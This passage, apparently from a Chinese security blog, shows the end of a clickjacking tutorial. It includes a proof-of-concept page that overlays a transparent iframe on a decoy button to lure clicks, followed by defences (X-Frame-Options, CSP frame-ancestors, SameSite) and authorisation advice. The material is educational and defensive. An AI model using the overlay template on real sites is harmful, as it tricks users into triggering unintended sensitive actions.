+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">html</span><span style="color:#f92672">,</span><span style="color:#f92672">body</span><span style="color:#f92672">,</span><span style="color:#f92672">iframe</span> { <span style="color:#66d9ef">display</span>:<span style="color:#66d9ef">block</span>; <span style="color:#66d9ef">height</span>:<span style="color:#ae81ff">100</span><span style="color:#66d9ef">%</span>; <span style="color:#66d9ef">width</span>:<span style="color:#ae81ff">100</span><span style="color:#66d9ef">%</span>; <span style="color:#66d9ef">margin</span>:<span style="color:#ae81ff">0</span>; <span style="color:#66d9ef">padding</span>:<span style="color:#ae81ff">0</span>; <span style="color:#66d9ef">border</span>:<span style="color:#66d9ef">none</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">iframe</span> { <span style="color:#66d9ef">opacity</span>:<span style="color:#ae81ff">0.5</span>; <span style="color:#66d9ef">filter</span>:<span style="color:#a6e22e">alpha</span>(opacity<span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0</span>); <span style="color:#66d9ef">position</span>:<span style="color:#66d9ef">absolute</span>; <span style="color:#66d9ef">z-index</span>:<span style="color:#ae81ff">2</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">button</span> { <span style="color:#66d9ef">position</span>:<span style="color:#66d9ef">absolute</span>; <span style="color:#66d9ef">top</span>:<span style="color:#ae81ff">450</span><span style="color:#66d9ef">px</span>; <span style="color:#66d9ef">left</span>:<span style="color:#ae81ff">850</span><span style="color:#66d9ef">px</span>; <span style="color:#66d9ef">z-index</span>:<span style="color:#ae81ff">1</span>; <span style="color:#66d9ef">width</span>:<span style="color:#ae81ff">72</span><span style="color:#66d9ef">px</span>; <span style="color:#66d9ef">height</span>:<span style="color:#ae81ff">26</span><span style="color:#66d9ef">px</span>; }
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>  万万想不到
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">button</span>&gt;查看详情&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.baidu.com/p/9536743109&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>注释：通过调整 <code>iframe</code> 的 <code>opacity</code>、按钮位置（<code>top</code>/<code>left</code>）及大小，可将按钮对准目标页面上的敏感操作按钮，诱导点击。</p>
+<hr>
+<h2 id="防护抗点击劫持">防护（抗点击劫持）</h2>
+<p>最简单且常用的防护方式是禁止敏感页面被 <code>iframe</code> 嵌入，常见实现方式：</p>
+<h3 id="使用-x-frame-options-响应头">使用 X-Frame-Options 响应头</h3>
+<ul>
+<li><code>DENY</code>：禁止任何站点通过 iframe 嵌入该页面。</li>
+<li><code>SAMEORIGIN</code>：只允许同源页面通过 iframe 嵌入。</li>
+<li><code>ALLOW-FROM uri</code>：允许特定来源嵌入（部分浏览器兼容性问题）。</li>
+</ul>
+<p>示例（PHP）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;X-Frame-Options: DENY&#34;</span>);
+</span></span></code></pre></div><h3 id="使用-csp-的-frame-ancestors-指令">使用 CSP 的 frame-ancestors 指令</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Security-Policy: frame-ancestors &#39;self&#39;;
+</span></span></span></code></pre></div><h3 id="其他补充措施">其他补充措施</h3>
+<ul>
+<li>使用 <code>SameSite</code>（<code>Lax</code> 或 <code>Strict</code>）减少跨站请求携带 cookie，降低攻击成功率。</li>
+<li>对重要操作增加二次确认或验证码、使用 POST 验证来源、检测 Referer/Origin 并拒绝异常来源。</li>
+</ul>
+<hr>
+<img src="/static/wx.png" alt="防护示意">
+<hr>
+<h2 id="合规与建议">合规与建议</h2>
+<ul>
+<li>在进行此类测试或复现时，请先获取明确书面授权并限定测试范围/窗口。</li>
+<li>对发现的高危问题（如能外带凭据或导致敏感操作被触发）应立刻与目标方沟通并给出修复建议（例如添加 HttpOnly、设置 X-Frame-Options、限制 JSONP 回调白名单）。</li>
+</ul>
+<hr></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="https://hzhsec.github.io/list/base_bug/sql%E6%B3%A8%E5%85%A5/sqlmap/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>sqlmap 使用速查与进阶技巧</span></a>
+    
+    
+    <a class="next" href="https://hzhsec.github.io/list/za_xiang/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8-git-%E6%8E%A8%E9%80%81-%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E5%86%B3/"><span>云服务器 Git 推送 问题与解决</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="https://hzhsec.github.io/">Hzhsec home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
